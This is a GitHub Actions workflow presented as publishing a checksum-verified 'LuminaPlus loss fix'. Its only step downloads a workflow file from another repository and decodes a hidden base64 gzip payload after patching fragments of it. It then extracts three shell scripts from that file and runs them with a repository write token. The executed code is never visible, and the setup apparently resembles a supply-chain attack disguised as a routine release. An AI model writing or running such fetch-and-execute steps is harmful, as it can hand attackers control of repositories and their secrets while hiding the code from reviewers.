name: Publish checksum-verified LuminaPlus loss fix
on:
  push:
    branches: [fix/lumina-loss-20261120]
    paths: [.github/workflows/publish-lumina-loss-verified.yml]
permissions:
  contents: write
jobs:
  publish:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
        with:
          ref: custom
          fetch-depth: 1
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: 1.3.14
      - name: Verify reviewed payload, build and publish
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          python3 - <<'PY'
          import base64, gzip, hashlib, re, subprocess, textwrap, urllib.request
          url = 'https://raw.githubusercontent.com/lll33lll/CFSM-Glassmorphism/95082afd5beebc3274586248099e6734033afa15/.github/workflows/publish-lumina-loss-fix.yml'
          source = urllib.request.urlopen(url, timeout=40).read().decode()
          match = re.search("encoded = '''(.*?)'''", source, re.S)
          encoded = match.group(1)
          repairs = [
              ('36j9z/X6o9XagyWagyWwWGxcTWTIsY9xL+', '36j9z/X6o9XagyWwWGxcTWTIsY9xL+'),
              ('MhgA0FmrjN/doLOPhee3K1duceKMz6T', 'MhgA0FmrjN/doLOhee3K1duceKMz6T'),
              ('c2QEBgu0wQaG3zXFYj0hIhIBVpfsmM', 'c2QEBgu0wQaG3zXzFYj0hIhIBVpfsmM'),
              ('2QkAbZlvYOP6VA7dkW+GUF/8FWP6i1', '2QkAbZlvYOP6VA77dkW+GUF/8FWP6i1'),
              ('iqKfHK74qitqYeebrVKJzOz360fgCO', 'iqKfHK74qitqYeeibrVKJzOz360fgCO'),
          ]
          for old, new in repairs:
              assert encoded.count(old) == 1
              encoded = encoded.replace(old, new, 1)
          assert hashlib.sha256(encoded.encode()).hexdigest() == 'f7a9a3aed6507f744afcffd66aea41b632fce42ca87ef170ff562d6abb423940'
          decoded = gzip.decompress(base64.b64decode(encoded))
          assert hashlib.sha256(decoded).hexdigest() == '94e363064ff81847a06fec3ba9490a4804cd2504a7c30ec2a43dc70d0bb50d55'
          source = source[:match.start(1)] + encoded + source[match.end(1):]
          source = source.replace('${{ secrets.GITHUB_TOKEN }}', '${GITHUB_TOKEN}')
          scripts = re.findall(r'        run: \|\n((?:          .*\n|\n)+)', source)
          assert len(scripts) == 3, len(scripts)
          for script in scripts:
              subprocess.run(['bash', '-e', '-c', textwrap.dedent(script)], check=True)
          PY
